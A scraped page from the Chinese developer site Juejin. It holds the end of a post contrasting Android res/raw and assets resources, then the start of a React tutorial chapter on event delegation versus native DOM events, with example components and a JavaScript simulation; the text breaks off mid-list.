pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>众所周知，Android 里，<code>assets</code> 和 <code>res/raw</code> 都可以用来放资源文件。那么为什么要设计这两种方式呢？</p>
<p>结论是：</p>
<ul>
<li><strong><code>res/raw</code></strong>：受 Android 资源系统管理的文件，无目录结构，有资源 ID。参与资源选择（语言/夜间/屏幕密度）；必须小写、无点号、无特殊字符。</li>
<li><strong><code>assets</code></strong>：打包进 APK 的原始文件系统，像读普通文件一样，适合需要目录结构 / 动态读取 / 文件较多或名称不规则的场景。</li>
</ul>
<h2 data-id="heading-0">一、不同点</h2>
<h3 data-id="heading-1">1.1. 特性对比</h3>



































<table><thead><tr><th>特性</th><th>raw</th><th>assets</th></tr></thead><tbody><tr><td>是否生成 R.id</td><td>✅</td><td>❌</td></tr><tr><td>是否参与资源选择（语言/夜间/屏幕密度）</td><td>✅</td><td>❌</td></tr><tr><td>编译期校验</td><td>✅</td><td>❌</td></tr><tr><td>是否必须小写、无点号、无特殊字符</td><td>✅</td><td>❌</td></tr><tr><td>是否可以遍历目录</td><td>❌</td><td>✅</td></tr></tbody></table>
<p>raw 的命名比较严格，我之前觉得这是一个缺陷，AI 老师说是是为了让资源名成为一种跨语言、跨工具、跨平台都稳定的符号。</p>
<p>比如要同时支持运行在大小写敏感/不敏感文件系统，那么就要让资源名舍弃大写字母；<code>.</code> 号在引用资源时已经用掉了之类的原因。</p>
<p>raw 要生成资源 id，在 <strong>Java / Kotlin / C++</strong> 等语言中引用，使用有这些限制。</p>
<p>assets 没有这些限制，因为 APK 安装后，assets 文件在 APK 内部就是一个 ZIP entry，它是 <strong>严格大小写敏感</strong>，Android 在访问时直接从 ZIP 读取，不走宿主文件系统。</p>
<h3 data-id="heading-2">1.2. 放置位置：</h3>
<p>raw 放在这里：</p>
<pre><code class="hljs language-css" lang="css">app/
 └─ <span class="hljs-attribute">src</span>/<span class="hljs-selector-tag">main</span>/
    └─ res/
       └─ raw/
          └─ config<span class="hljs-selector-class">.txt</span>
</code></pre>
<p>assets 放在这里：</p>
<pre><code class="hljs language-css" lang="css">app/
 └─ <span class="hljs-attribute">src</span>/<span class="hljs-selector-tag">main</span>/
    └─ assets/
       └─ configs/
          └─ config<span class="hljs-selector-class">.txt</span>
</code></pre>
<h3 data-id="heading-3">1.3. 使用场景</h3>
<blockquote>
<p>我之前有一个误解，apk 安装后，资源文件会被放在一个文件目录下，我误以为可以在 apk 安装后，从服务器下载文件，也放到这个目录下面，再通过 assets 或者 raw 来读取。我以为 assets 或者 raw 能够做到这一点。
实际上是不行的，APK 是一个 <strong>签名过的 ZIP 文件</strong>，任何修改都会破坏签名。</p>
<p>这种 case 通常的做法是，从 assets 拷贝到 filesDir 文件夹，然后服务器也下载到这个 filesDir 文件夹。而不是直接下到 assets 或者 raw 中，这是不可能的。</p>
</blockquote>
<p>一个常见的使用 assets 的场景：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// SDK 启动时，把 assets 里的本地数据拷贝到 filesDir</span>
<span class="hljs-built_in">copyAssetsToFilesDir</span>()
<span class="hljs-comment">// 与服务器通信，检查这些资源是否需要更新</span>
<span class="hljs-built_in">updateFromServerIfNeeded</span>()
</code></pre>
<p>这就是 <strong>固定资源 + 可更新数据</strong> 的组合，而 raw 做不到目录、遍历、动态拷贝。</p>
<p>一个常见的使用 raw 的场景：</p>
<pre><code class="hljs language-bash" lang="bash">res/raw/config.txt
res/raw-night/config.txt
res/raw-zh/config.txt
res/raw-zh-rCN/config.txt
...
</code></pre>
<p>Android 会自动帮你选：</p>
<ul>
<li>night / notnight</li>
<li>zh / en</li>
<li>region</li>
<li>smallestWidth</li>
<li>density</li>
<li>...</li>
</ul>
<p><strong>assets 完全没有这个能力</strong></p>
<h3 data-id="heading-4">1.4. 读取方式</h3>
<p>读取 raw 的方式是按 ID 取资源，以文件 <code>res/raw/config.txt</code> 为例：</p>
<pre><code class="hljs language-ini" lang="ini">val <span class="hljs-attr">inputStream</span> = resources.openRawResource(R.raw.config)
val <span class="hljs-attr">text</span> = inputStream.bufferedReader().use { it.readText() }
</code></pre>
<p>读取 assets 的方式是按路径读文件：</p>
<pre><code class="hljs language-ini" lang="ini">val <span class="hljs-attr">inputStream</span> = assets.open(<span class="hljs-string">"configs/config.txt"</span>)
val <span class="hljs-attr">text</span> = inputStream.bufferedReader().use { it.readText() }
</code></pre>
<h2 data-id="heading-5">二、相同点</h2>
<ul>
<li>两者在 apk 中都以原始资源文件的方式存在</li>
<li>两者本质都是从 APK 中读取 InputStream</li>
<li>性能差异基本可以忽略</li>
</ul>
<h2 data-id="heading-6">三、如何选择</h2>
<p>简单来说：</p>
<ul>
<li>如果你把它当成‘资源’（需要参与语言/夜间等选择、生成 R.id），用 raw</li>
<li>如果把它当成‘文件’（目录结构、动态访问、可更新），用 assets。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React从入门到出门第六章 事件代理机制与原生事件协同]]></title>    <link>https://juejin.cn/post/7594322573452984363</link>    <guid>https://juejin.cn/post/7594322573452984363</guid>    <pubDate>2026-01-13T01:14:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594322573452984363" data-draft-id="7589940210832261163" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React从入门到出门第六章  事件代理机制与原生事件协同"/> <meta itemprop="keywords" content="前端,JavaScript,React.js"/> <meta itemprop="datePublished" content="2026-01-13T01:14:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="怕浪猫"/> <meta itemprop="url" content="https://juejin.cn/user/2832784963939438"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React从入门到出门第六章  事件代理机制与原生事件协同
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2832784963939438/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    怕浪猫
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:14:15.000Z" title="Tue Jan 13 2026 01:14:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a37377a1b1654b5fb359bed851213933~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCV5rWq54yr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768871655&amp;x-signature=B10uyEKh1Z2yZq%2Bx8zDLuPaGOuk%3D" alt="G9oIeDzXQAIwgJc.jpeg" loading="lazy"/>
大家好～ 前面我们陆续掌握了 React 19 的组件、路由、状态管理等核心知识点，今天咱们聚焦一个容易被忽略但至关重要的底层模块——<strong>事件系统</strong>。</p>
<p>用过 React 的同学都知道，我们在组件中写的事件（如 onClick、onChange）和原生 DOM 事件看似相似，却又存在差异：比如 React 事件的 this 指向默认绑定组件实例、事件对象是合成事件（SyntheticEvent）、事件处理函数默认不会冒泡到原生 DOM 层面。这些差异的背后，都源于 React 对原生事件的封装与优化——核心就是<strong>事件代理机制</strong>。</p>
<p>很多开发者在实际开发中会遇到“React 事件与原生事件冲突”“事件冒泡不符合预期”等问题，本质上是没理清 React 事件系统与原生事件的关系。今天这篇文章，我们就从“是什么-为什么-怎么做”三个层面，拆解 React 19 事件系统的核心原理，重点说清 React UI 事件与原生 window 事件的关联，结合代码示例和流程图，让你既能理解底层逻辑，也能解决实际开发中的问题～</p>
<h2 data-id="heading-0">一、先抛问题：React 事件和原生事件有啥不一样？</h2>
<p>在拆解原理前，我们先通过一个简单案例，直观感受 React 事件与原生事件的差异。先看代码：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useEffect, useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">EventDemo</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> btnRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-comment">// React 事件：onClick</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleReactClick</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'React 事件：onClick 触发'</span>);
  };

  <span class="hljs-comment">// 原生事件：addEventListener</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> btn = btnRef.<span class="hljs-property">current</span>;
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleNativeClick</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'原生事件：addEventListener 触发'</span>);
    };
    btn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handleNativeClick);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      btn.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, handleNativeClick);
    };
  }, []);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{btnRef}</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleReactClick}</span>&gt;</span>
      点击测试
    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
  );
}
</code></pre>
<p>点击按钮后，控制台输出顺序是：<code>原生事件：addEventListener 触发</code> → <code>React 事件：onClick 触发</code>。这个顺序是不是和你预期的不一样？</p>
<p>再把案例改一下，给按钮的父元素也添加事件：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useEffect, useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">EventDemo</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> btnRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);
  <span class="hljs-keyword">const</span> parentRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-comment">// 父元素 React 事件</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleParentReactClick</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'父元素 React 事件：onClick 触发'</span>);
  };

  <span class="hljs-comment">// 子元素 React 事件</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleReactClick</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'子元素 React 事件：onClick 触发'</span>);
  };

  <span class="hljs-comment">// 父元素原生事件</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> parent = parentRef.<span class="hljs-property">current</span>;
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleParentNativeClick</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'父元素原生事件：addEventListener 触发'</span>);
    };
    parent.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handleParentNativeClick);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      parent.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, handleParentNativeClick);
    };
  }, []);

  <span class="hljs-comment">// 子元素原生事件</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> btn = btnRef.<span class="hljs-property">current</span>;
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleNativeClick</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'子元素原生事件：addEventListener 触发'</span>);
    };
    btn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handleNativeClick);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      btn.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, handleNativeClick);
    };
  }, []);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{parentRef}</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleParentReactClick}</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">padding:</span> '<span class="hljs-attr">20px</span>', <span class="hljs-attr">border:</span> '<span class="hljs-attr">1px</span> <span class="hljs-attr">solid</span> #<span class="hljs-attr">ccc</span>' }}&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{btnRef}</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleReactClick}</span>&gt;</span>
        点击测试
      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<p>点击按钮后，控制台输出顺序是：</p>
<ol>
<li>子元素原生事件：addEventListener 触发（原生冒泡阶段先触发子元素）</li>
<li>父元素原生事件：addEventListener 触发（原生冒泡阶段向上传播）</li>
<li>子元素 React 事件：onClick 触发</li>
<li>父元素 React 事件：onClick 触发</li>
</ol>
<p>这个结果更让人困惑了：为什么原生事件的冒泡顺序和 React 事件的冒泡顺序完全相反？为什么 React 事件总是在原生事件之后触发？要解答这些问题，我们必须先搞懂 React 事件系统的核心——<strong>事件代理机制</strong>。</p>
<h2 data-id="heading-1">二、核心原理 1：React 事件代理机制（事件委托）</h2>
<p>React 事件系统的核心优化点就是“事件代理”（也叫事件委托）。在原生 DOM 中，我们通常会给每个元素单独绑定事件；而 React 则是将<strong>所有 UI 事件（如 onClick、onChange、onMouseMove 等）都委托给了最顶层的 document 节点</strong>（React 17 及之后版本改为委托给 root 节点，即 React 挂载的根容器，如 #root，React 19 延续这一设计）。</p>
<h3 data-id="heading-2">1. 事件代理的核心逻辑</h3>
<p>简单来说，React 事件代理的流程是：</p>
<ol>
<li>React 组件渲染时，并不会给对应的 DOM 元素直接绑定事件处理函数，而是将事件类型（如 click）、事件处理函数、组件信息等存入一个“事件注册表”；</li>
<li>在 React 挂载的根容器（如 #root）上，统一绑定原生事件（如 addEventListener('click', 统一处理函数)）；</li>
<li>当用户点击元素时，事件会从目标元素原生冒泡到根容器；</li>
<li>根容器的统一处理函数捕获到事件后，会根据事件目标（target）从“事件注册表”中找到对应的 React 事件处理函数，然后执行。</li>
</ol>
<h3 data-id="heading-3">2. 用图例梳理事件代理流程</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/885c87f09c314b15b3168b4929375f50~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCV5rWq54yr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768871655&amp;x-signature=cvzACer1lZ6fESPPLfNlr%2B2OMqA%3D" alt="dispatch-event.46e8e5ef.png" loading="lazy"/></p>
<h3 data-id="heading-4">3. 简化代码模拟 React 事件代理</h3>
<p>为了让大家更直观理解，我们用原生 JS 模拟 React 事件代理的核心逻辑：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. 事件注册表：存储 React 组件的事件信息</span>
<span class="hljs-keyword">const</span> eventRegistry = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();

<span class="hljs-comment">// 2. React 根容器（模拟 #root）</span>
<span class="hljs-keyword">const</span> root = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'root'</span>);

<span class="hljs-comment">// 3. 统一事件处理函数（根容器绑定的原生事件处理函数）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleRootEvent</span>(<span class="hljs-params">e</span>) {
  <span class="hljs-comment">// e.target 是事件的实际目标（如按钮）</span>
  <span class="hljs-keyword">const</span> target = e.<span class="hljs-property">target</span>;

  <span class="hljs-comment">// 从事件注册表中查找当前目标及祖先元素的事件处理函数</span>
  <span class="hljs-keyword">let</span> current = target;
  <span class="hljs-keyword">const</span> handlers = [];

  <span class="hljs-keyword">while</span> (current &amp;&amp; current !== root) {
    <span class="hljs-comment">// 查找当前元素对应的事件处理函数（这里简化为 click 事件）</span>
    <span class="hljs-keyword">const</span> eventKey = <span class="hljs-string">`<span class="hljs-subst">${current.dataset.reactId}</span>-click`</span>;
    <span class="hljs-keyword">if</span> (eventRegistry.<span class="hljs-title function_">has</span>(eventKey)) {
      handlers.<span class="hljs-title function_">push</span>(eventRegistry.<span class="hljs-title function_">get</span>(eventKey));
    }
    <span class="hljs-comment">// 向上遍历祖先元素（模拟冒泡）</span>
    current = current.<span class="hljs-property">parentNode</span>;
  }

  <span class="hljs-comment">// 执行找到的事件处理函数（顺序：子元素 → 父元素，模拟 React 事件冒泡）</span>
  handlers.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">handler</span> =&gt;</span> <span class="hljs-title function_">handler</span>(e));
}

<span class="hljs-comment">// 4. 给根容器绑定原生事件（模拟 React 初始化时的绑定）</span>
root.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handleRootEvent);

<span class="hljs-comment">// 5. 模拟 React 组件绑定事件（将事件存入注册表）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">bindReactEvent</span>(<span class="hljs-params">reactId, element, eventType, handler</span>) {
  element.<span class="hljs-property">dataset</span>.<span class="hljs-property">reactId</span> = reactId; <span class="hljs-comment">// 给元素标记 React ID</span>
  <span class="hljs-keyword">const</span> eventKey = <span class="hljs-string">`<span class="hljs-subst">${reactId}</span>-<span class="hljs-subst">${eventType}</span>`</span>;
  eventRegistry.<span class="hljs-title function_">set</span>(eventKey, handler);
}

<span class="hljs-comment">// 6. 测试：创建组件元素并绑定 React 事件</span>
<span class="hljs-keyword">const</span> parentDiv = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
parentDiv.<span class="hljs-property">style</span>.<span class="hljs-property">padding</span> = <span class="hljs-string">'20px'</span>;
parentDiv.<span class="hljs-property">style</span>.<span class="hljs-property">border</span> = <span class="hljs-string">'1px solid #ccc'</span>;

<span class="hljs-keyword">const</span> btn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'button'</span>);
btn.<span class="hljs-property">textContent</span> = <span class="hljs-string">'点击测试'</span>;
parentDiv.<span class="hljs-title function_">appendChild</span>(btn);
root.<span class="hljs-title function_">appendChild</span>(parentDiv);

<span class="hljs-comment">// 给父元素绑定 React 点击事件</span>
<span class="hljs-title function_">bindReactEvent</span>(<span class="hljs-string">'parent-1'</span>, parentDiv, <span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'父元素 React 事件：onClick 触发'</span>);
});

<span class="hljs-comment">// 给子元素绑定 React 点击事件</span>
<span class="hljs-title function_">bindReactEvent</span>(<span class="hljs-string">'btn-1'</span>, btn, <span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'子元素 React 事件：onClick 触发'</span>);
});

<span class="hljs-comment">// 给子元素绑定原生点击事件</span>
btn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'子元素原生事件：addEventListener 触发'</span>);
});

<span class="hljs-comment">// 给父元素绑定原生点击事件</span>
parentDiv.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'父元素原生事件：addEventListener 触发'</span>);
});
</code></pre>
<p>运行这段代码后，点击按钮的输出顺序和我们之前的 React 案例完全一致！这就验证了 React 事件代理的核心逻辑：<strong>React 事件是通过根容器的原生事件统一捕获，再通过事件注册表查找并执行对应的处理函数，其“冒泡”是模拟出来的，而非原生 DOM 冒泡</strong>。</p>
<h2 data-id="heading-5">三、核心原理 2：React UI 事件与原生 window 事件的关系</h2>
<p>理解了事件代理机制后，我们就能清晰厘清 React UI 事件与原生 window 事件的关系了。首先要明确两个核心概念：</p>
<ul>
<li><strong>React UI 事件</strong>：就是我们在组件中写的 onClick、onChange 等事件，是 React 封装后的“合成事件”，依赖事件代理机制执行；</li>
